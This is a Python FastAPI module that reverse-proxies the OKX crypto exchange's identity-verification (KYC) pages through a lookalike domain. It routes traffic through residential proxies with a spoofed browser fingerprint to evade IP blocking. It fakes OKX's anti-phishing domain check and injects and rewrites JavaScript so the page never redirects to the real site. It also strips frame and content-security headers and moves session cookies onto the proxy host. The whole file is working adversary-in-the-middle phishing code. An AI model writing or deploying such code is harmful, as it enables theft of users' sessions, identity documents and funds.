"""OKX gateway (KYC) — separate from the Binance gateway (routers/proxy.py).

Same architecture as the Binance mirror but targeted at www.okx.com:
  - Rewrite all okx.com host families back to the proxy host.
  - Egress through a sticky residential proxy with a real-browser TLS/HTTP2
    fingerprint (curl_cffi) so the KYC API isn't IP/fingerprint blocked.
  - Fetch the static CDN direct (fast) — it is not IP-sensitive.
  - KYC-only allowlist.

The subdomain (first label of the Host header) is only a proxy key for
get_proxy_for_sub — it is not a service selector. This router is the primary
gateway for the OKX service.
"""

from __future__ import annotations

import base64
import json
import logging
import os
import re
from urllib.parse import urlparse

import httpx
from fastapi import APIRouter, Request, WebSocket, WebSocketDisconnect
from fastapi.responses import JSONResponse, Response

from db.queries import get_proxy_for_sub
from chrome.client import ChromeRetryClient

try:
    from chrome.browser_egress import BrowserEgressClient
except Exception:  # noqa: BLE001 - degrade gracefully if curl_cffi missing
    BrowserEgressClient = None

router = APIRouter(tags=["gateway-okx"])
logger = logging.getLogger("gateway_okx")

# ---------------------------------------------------------------------------
# Config
# ---------------------------------------------------------------------------
OKX_UPSTREAM_HOST = "www.okx.com"
OKX_UPSTREAM_URL = f"https://{OKX_UPSTREAM_HOST}"
OKX_WS_HOST = "ws.okx.com"

BROWSER_IMPERSONATE = os.getenv("OKX_EGRESS_IMPERSONATE", "chrome131_android")
BROWSER_USER_AGENT = os.getenv("OKX_EGRESS_USER_AGENT") or None

HOP_BY_HOP_HEADERS = {
    "host", "connection", "keep-alive", "proxy-authenticate",
    "proxy-authorization", "te", "trailers", "upgrade",
    "content-length", "accept-encoding",
}

# ---------------------------------------------------------------------------
# Host families
# ---------------------------------------------------------------------------
# CDN (static) hosts — served direct (not IP-sensitive).
OKX_STATIC_HOSTS = {
    "static.okx.com", "static.okx.ac", "static.okx.cab", "static.okx.reise",
}
# Tracking / push — routed through the egress (hides client IP).
OKX_TRACK_HOSTS = {"tr.okx.com", "jpush.okx.com", "jpushws.okx.com"}
# All managed okx.com hosts (for b64-prefix decoding + response rewriting).
OKX_MANAGED_HOSTS = OKX_STATIC_HOSTS | OKX_TRACK_HOSTS


def _b64(host: str) -> str:
    return base64.urlsafe_b64encode(host.encode()).decode().rstrip("=")


def _is_okx_host_name(host: str) -> bool:
    # okx.com / *.okx.<tld>  (OKX uses many CDN TLDs: okx.com, okx.ac,
    # okx.cab, okx.reise, ...) and okcoin.com (parent company infra,
    # fraud detection, etc.)
    return bool(
        re.fullmatch(r"(?:[a-z0-9-]+\.)*okx\.[a-z]{2,10}", host, re.IGNORECASE)
        or re.fullmatch(r"(?:[a-z0-9-]+\.)*okcoin\.[a-z]{2,10}", host, re.IGNORECASE)
    )


def _b64_decode(segment: str) -> str | None:
    if not segment or len(segment) < 6:
        return None
    pad = "=" * (-len(segment) % 4)
    try:
        host = base64.urlsafe_b64decode((segment + pad).encode()).decode()
    except Exception:
        return None
    if _is_okx_host_name(host):
        return host.lower()
    return None


# URL rewrites for response bodies.
#   www.okx.com  -> proxy host (default)
#   other okx.com / okcoin.com hosts -> proxy host/<b64(host)>
_OKX_CDN_RE = re.compile(
    r"((?:https?:)?//)(static\.okx\.[a-z]{2,10}|tr\.okx\.com|jpush\.okx\.com|jpushws\.okx\.com|[a-z0-9.-]*\.okcoin\.[a-z]{2,10})",
    re.IGNORECASE,
)
_OKX_MAIN_RE = re.compile(r"((?:https?:)?//)www\.okx\.com", re.IGNORECASE)
_OKX_HOST_HINTS = (b"okx.com", b"okx.ac", b"okx.cab", b"okx.reise", b"okcoin.com")

# ---------------------------------------------------------------------------
# Allowlist (KYC-only)
# ---------------------------------------------------------------------------
# Any KYC-section page: /<locale>/kyc-verify, /<locale>/kyc/common-page/...
KYC_PAGE_RE = re.compile(r"^/[a-z]{2,3}/kyc", re.IGNORECASE)
# OKX API bases the KYC flow hits: /v3/ (main, incl. /v3/comp/kyc/*),
# /priapi/ (private), /et/ (event), /web-api/, /okx-api/, /v1/, /v2/.
OKX_API_RE = re.compile(
    r"^/(v[123]|priapi|et|api|web-api|okx-api)/", re.IGNORECASE
)
CDN_RE = re.compile(r"^/cdn/", re.IGNORECASE)


def _upstream_okx_allowed(upstream_host: str, upstream_path: str) -> bool:
    if upstream_host in OKX_STATIC_HOSTS:
        return True
    if upstream_host in (OKX_UPSTREAM_HOST, "okx.com"):
        return bool(KYC_PAGE_RE.match(upstream_path)
                    or OKX_API_RE.match(upstream_path)
                    or CDN_RE.match(upstream_path))
    if upstream_host in OKX_TRACK_HOSTS:
        return True
    # OkCoin parent-company infrastructure (fraud detection, etc.)
    if _is_okx_host_name(upstream_host):
        return True
    return False


# ---------------------------------------------------------------------------
# Anti-phishing domain allowlist check (biz_domains_allowlist_check)
# ---------------------------------------------------------------------------
# ~200 ms after page load the okx-nav bundle POSTs the page hostname to
# /v2/support/variants with body {"flow":"biz_domains_allowlist_check",
# "domains":["<hostname>"]}. If the response is not
# {"code":0,"data":{"<hostname>":true}} it calls
# location.assign("https://www.okx.com") — and it is fail-CLOSED: network
# errors (after 2 retries) and code!=0 redirect as well.
#
# This cannot be stopped the usual ways:
#   - the redirect target is assembled at runtime from obfuscated
#     string-array fragments, so static URL rewrites never match it;
#   - Chrome's location.assign/replace/href are own, non-configurable,
#     non-writable properties, so JS hooks fail silently.
# The only client-side fix is to make the check SUCCEED: answer this flow
# locally with the hostname allowlisted. Everything else still passes
# through to the upstream API unchanged.
ANTI_PHISHING_FLOW = "biz_domains_allowlist_check"
ANTI_PHISHING_PATH = "/v2/support/variants"


def _anti_phishing_response(body: bytes) -> JSONResponse | None:
    """Return a local 'domain is allowlisted' response for the
    biz_domains_allowlist_check flow, or None to pass the request upstream."""
    if not body:
        return None
    try:
        req = json.loads(body)
    except Exception:  # noqa: BLE001
        return None
    if not isinstance(req, dict) or req.get("flow") != ANTI_PHISHING_FLOW:
        return None
    domains = req.get("domains")
    data = {d: True for d in domains if isinstance(d, str)} if isinstance(domains, list) else {}
    logger.info("OKX anti-phishing allowlist check spoofed locally: %s", data)
    return JSONResponse(
        {
            "code": 0,
            "data": data,
            "detailMsg": "",
            "error_code": "0",
            "error_message": "",
            "msg": "",
        }
    )


# ---------------------------------------------------------------------------
# Egress
# ---------------------------------------------------------------------------
def _make_egress_client(proxy):
    if BrowserEgressClient is not None:
        return BrowserEgressClient(
            proxy=proxy, impersonate=BROWSER_IMPERSONATE, user_agent=BROWSER_USER_AGENT
        )
    return ChromeRetryClient(proxy=proxy)


# ---------------------------------------------------------------------------
# Rewrites
# ---------------------------------------------------------------------------
def _rewrite_okx_urls(text: str, proxy_host: str) -> str:
    # CDN / tracking / push hosts -> proxy host/<b64(host)>
    def _cdn(m: re.Match) -> str:
        return f"{m.group(1)}{proxy_host}/{_b64(m.group(2))}"
    text = _OKX_CDN_RE.sub(_cdn, text)
    # main host -> proxy host (keep the original scheme prefix)
    def _main(m: re.Match) -> str:
        return f"{m.group(1)}{proxy_host}"
    text = _OKX_MAIN_RE.sub(_main, text)
    # Anti-phishing hardening: the okx-nav bundle assembles its redirect
    # target at RUNTIME from obfuscated string-array fragments
    # ("https://ww" + "w.okx.com", "https://we" + "b3.okx.com",
    #  "https://ww" + "w.okx.ai"), so the //www.okx.com rewrite above can
    # never match it. Re-aim the fragments at the proxy host so even a
    # failed allowlist check navigates back to the proxy. The fragments are
    # obfuscator-seeded and may change between deploys — if they don't
    # match, this degrades to a no-op (the local API spoof still protects).
    host_only = proxy_host.split(":")[0]
    for fragment, replacement in (
        ('"https://ww"', '"https://"'),
        ('"https://we"', '"https://"'),
        ('"w.okx.com"', f'"{host_only}"'),
        ('"w.okx.ai"', f'"{host_only}"'),
        ('"b3.okx.com"', f'"{host_only}"'),
    ):
        if fragment in text:
            text = text.replace(fragment, replacement)
    # Append the proxy's registrable domain to the officialSiteUrl list so the
    # page recognises the proxy host as an OKX site and does NOT redirect the
    # browser to the real OKX domain. e.g. adds ".getverified.cc" to the list.
    if "officialSiteUrl" in text:
        host = proxy_host.split(":")[0]
        parts = host.split(".")
        suffix = ("." + ".".join(parts[-2:])) if len(parts) >= 2 else host
        text = re.sub(
            r"(officialSiteUrl\s*:\s*\[)([^\]]*)\]",
            lambda m: f'{m.group(1)}{m.group(2)},"{suffix}"]',
            text,
            count=1,
        )
    return text


def _patch_okx_nav_redirect(text: str) -> str:
    """Patch the OKX nav JS that redirects the browser to the real OKX domain.

    OKX's okxGlobal JS computes a redirect URL via getNewUrl() and calls
    window.location.replace(p). We rewrite that call so the URL is re-anchored
    to the current (proxy) origin, keeping the browser on the proxy. The
    __okxRW helper is defined by _inject_nav_hook in the HTML head.
    """
    # Rewrite: window.location.replace(<arg>)  ->  window.location.replace(window.__okxRW(<arg>))
    # Use a regex to handle any argument (variable name, expression, etc).
    text = re.sub(
        r"window\.location\.replace\(([^)]*)\)",
        r"window.location.replace(window.__okxRW(\1))",
        text,
    )
    return text


def _inject_nav_hook(text: str) -> str:
    """Inject a script (before any SPA script) that rewrites top-level navigations
    to okx.* back to the current (proxy) origin. OKX's SPA redirects the browser
    to the real OKX domain via a runtime-computed URL (getNewUrl +
    location.replace), which literal-string rewriting cannot catch."""
    script = (
        "<script>(function(){"
        "window.__okxNavLog=[];"
        "window.__okxRW=function(u){if(typeof u!=='string')return u;"
        "var m=u.match(/^(?:https?:)?\\/\\/[a-z0-9.-]*okx\\.[a-z.]+/i);"
        "var r=m?location.origin+u.slice(m[0].length):u;"
        "if(window.__okxNavLog&&m)window.__okxNavLog.push({rw:u,res:r});"
        "return r;};"
        "try{var r=location.replace;"
        "if(r)location.replace=function(u){window.__okxNavLog.push({src:'replace',u:u});return r.call(this,window.__okxRW(u));};}catch(e){}"
        "try{var a=location.assign;"
        "if(a)location.assign=function(u){window.__okxNavLog.push({src:'assign',u:u});return a.call(this,window.__okxRW(u));};}catch(e){}"
        "try{var d=Object.getOwnPropertyDescriptor(location,'href');"
        "if(d&&d.configurable&&d.set)Object.defineProperty(location,'href',{configurable:true,get:d.get,"
        "set:function(v){window.__okxNavLog.push({src:'href',u:v});return d.set.call(this,window.__okxRW(v));}});}catch(e){}"
        "window.__okxNavLog.push({src:'init',href:location.href,"
        "hrefConf:!!(Object.getOwnPropertyDescriptor(location,'href')||{}).configurable});"
        "})();</script>"
    )
    low = text.lower()
    for tag in ("<head>", "<head "):
        i = low.find(tag)
        if i != -1:
            j = text.index(">", i) + 1
            return text[:j] + "\n" + script + text[j:]
    return script + text


def _rewrite_location_okx(location: str, request: Request) -> str:
    if not location:
        return location
    p = urlparse(location)
    if p.scheme in ("http", "https") and p.hostname:
        host = p.hostname.lower()
        suffix = p.path or "/"
        if p.query:
            suffix += f"?{p.query}"
        if host in (OKX_UPSTREAM_HOST, "okx.com"):
            return suffix
        if _is_okx_host_name(host):
            return f"/{_b64(host)}{suffix}"
    return location


def _rewrite_set_cookie_okx(cookie: str) -> str:
    # Re-anchor set-cookie domain/path so cookies live on the proxy host.
    out = []
    for part in cookie.split(";"):
        p = part.strip().lower()
        if p.startswith("domain="):
            continue
        if p.startswith("path="):
            out.append("path=/")
            continue
        out.append(part)
    return "; ".join(out)


def _add_cors_okx(resp: Response, request: Request) -> None:
    origin = request.headers.get("origin", "*")
    resp.headers["Access-Control-Allow-Origin"] = origin
    resp.headers["Access-Control-Allow-Credentials"] = "true"
    resp.headers["Access-Control-Allow-Headers"] = "*"
    resp.headers["Access-Control-Allow-Methods"] = "GET, POST, PUT, DELETE, PATCH, OPTIONS, HEAD"


# ---------------------------------------------------------------------------
# Routes
# ---------------------------------------------------------------------------
@router.api_route("/{path:path}", methods=["GET", "POST", "PUT", "DELETE", "PATCH", "OPTIONS"])
async def okx_proxy_http(path: str, request: Request):
    """OKX HTTP gateway (primary). The subdomain is only a proxy key."""
    host = request.headers.get("host", request.url.netloc)
    logger.info(f"OKX proxying: {request.method} {request.url}")
    sub = host.split(".")[0]
    query = request.url.query
    proxy_host = host

    first_segment = path.split("/", 1)[0]
    b64_host = _b64_decode(first_segment)
    if b64_host:
        upstream_host = b64_host
        upstream_path = path[len(first_segment):] or "/"
    else:
        upstream_host = OKX_UPSTREAM_HOST
        upstream_path = "/" + path

    if not _upstream_okx_allowed(upstream_host, upstream_path):
        return Response(content="This gateway serves only the OKX KYC flow.", status_code=403)

    target_url = f"https://{upstream_host}{upstream_path}" + (f"?{query}" if query else "")
    http_proxy = await get_proxy_for_sub(str(sub))

    # CDN (static) is not IP-sensitive -> fast datacenter egress; the main
    # host (SPA + KYC API) goes through the residential egress for IP
    # consistency / to bypass the IP block.
    if upstream_host in OKX_STATIC_HOSTS:
        http_proxy = None

    headers = {
        k: v for k, v in request.headers.items()
        if k.lower() not in HOP_BY_HOP_HEADERS
        and k.lower() not in ("user-agent", "origin", "referer")
    }
    headers["Host"] = upstream_host
    headers["Origin"] = OKX_UPSTREAM_URL
    headers["Referer"] = f"{OKX_UPSTREAM_URL}/{path}"

    body = await request.body()

    # The anti-phishing domain allowlist check must succeed locally, or the
    # nav bundle redirects the browser to the real OKX domain (fail-closed:
    # even a dropped/blocked request redirects after retries).
    if request.method == "POST" and upstream_path == ANTI_PHISHING_PATH:
        spoofed = _anti_phishing_response(body)
        if spoofed is not None:
            return spoofed

    try:
        async with _make_egress_client(http_proxy) as client:
            upstream_resp = await client.request_with_retry(
                method=request.method,
                url=target_url,
                headers=headers,
                content=body,
                cookies=request.cookies,
                timeout=httpx.Timeout(30.0),
                follow_redirects=False,
            )
    except Exception as e:
        logger.error(f"OKX Gateway Error [{target_url}]: {e}")
        return Response(content=f"Gateway error: {e}", status_code=502)

    passthrough_headers = {
        k: v for k, v in upstream_resp.headers.items()
        if k.lower() not in {
            "content-encoding", "transfer-encoding", "connection",
            "content-length", "set-cookie", "content-security-policy",
            "x-frame-options", "link",
        }
    }
    # Rewrite the Link header (rel=preload / rel=preconnect) so it points to
    # the proxy instead of the real OKX domain.
    link_header = upstream_resp.headers.get("link", "")
    if link_header:
        link_header = _rewrite_okx_urls(link_header, proxy_host)
        passthrough_headers["link"] = link_header

    content = upstream_resp.content
    ctype = (upstream_resp.headers.get("content-type") or "").lower()
    if content and any(t in ctype for t in ("text/html", "javascript", "json", "css")) \
            and (any(h in content for h in _OKX_HOST_HINTS) or b"officialSiteUrl" in content):
        try:
            text = content.decode("utf-8", errors="replace")
            text = _rewrite_okx_urls(text, proxy_host)
            if "text/html" in ctype:
                text = _inject_nav_hook(text)
            if "javascript" in ctype or "text/html" in ctype:
                text = _patch_okx_nav_redirect(text)
            content = text.encode("utf-8")
        except Exception:
            logger.exception("OKX URL rewrite error")

    if upstream_resp.status_code in (301, 302, 303, 307, 308):
        resp = Response(content=content or b"", status_code=upstream_resp.status_code,
                        headers=passthrough_headers)
        resp.headers["Location"] = _rewrite_location_okx(
            upstream_resp.headers.get("location", ""), request)
    else:
        resp = Response(content=content, status_code=upstream_resp.status_code,
                        headers=passthrough_headers)

    for c in (upstream_resp.headers.get_list("set-cookie")
              if hasattr(upstream_resp.headers, "get_list")
              else [v for k, v in upstream_resp.headers.items() if k.lower() == "set-cookie"]):
        resp.headers.append("set-cookie", _rewrite_set_cookie_okx(c))

    _add_cors_okx(resp, request)
    return resp


@router.websocket("/{path:path}")
async def okx_proxy_ws(websocket: WebSocket, path: str):
    await websocket.accept()
    query = str(websocket.query_params)
    clean_path = path if path.startswith("/") else f"/{path}"
    import websockets
    target = f"wss://{OKX_WS_HOST}{clean_path}" + (f"?{query}" if query else "")
    try:
        async with websockets.connect(target, useragent_header="Mozilla/5.0") as upstream:
            while True:
                msg = await websocket.receive()
                if msg["type"] == "websocket.disconnect":
                    break
                if "text" in msg and msg["text"] is not None:
                    await upstream.send(msg["text"])
                if "bytes" in msg and msg["bytes"] is not None:
                    await upstream.send(msg["bytes"])
    except Exception as e:
        logger.error(f"OKX WS error: {e}")
    finally:
        await websocket.close()
